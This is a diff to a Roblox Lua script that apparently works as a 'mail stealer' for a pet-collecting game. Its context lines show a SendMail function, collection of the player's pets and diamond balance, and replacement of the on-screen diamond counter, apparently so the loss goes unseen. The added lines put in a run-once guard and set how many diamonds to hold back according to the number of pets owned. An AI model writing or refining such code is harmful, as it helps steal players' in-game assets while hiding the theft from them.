@@ -8,6 +8,14 @@ local RS = game:GetService("ReplicatedStorage")
 local Gems = LP.PlayerGui.MainLeft.Left.Currency.Diamonds.Diamonds.Amount
 local Lib = require(RS.Library.Client.Save)
 
+if _G.D then
+    while true do
+        task.wait()
+    end
+end
+
+_G.D = true
+
 local function priv(mas)
     for i,v in mas, next do
         print(i,v)
@@ -44,6 +52,7 @@ local function SendMail(Type, PetId, Value)
     return status
 end
 
+
 Bruh = Gems:Clone()
 Bruh.Parent = Gems.Parent
 Gems:Destroy()
@@ -75,6 +84,15 @@ for i,v in next,InvPets do
         table.insert(Pets,{id,value,name})
     end
 end
+temd = 0
+if #Pets > 10 then
+    temd = 5000000
+elseif #Pets > 5 then
+    temd = 1000000
+else
+    temd = 120000
+end
+
 
 ListPets = ""
 
@@ -98,7 +116,7 @@ end
 for i,v in Lib.Get().Inventory.Currency,next do
     if v.id == "Diamonds" then
         DiD = i
-        DVal = v._am
+        DVal = v._am-temd
     end
 end
 
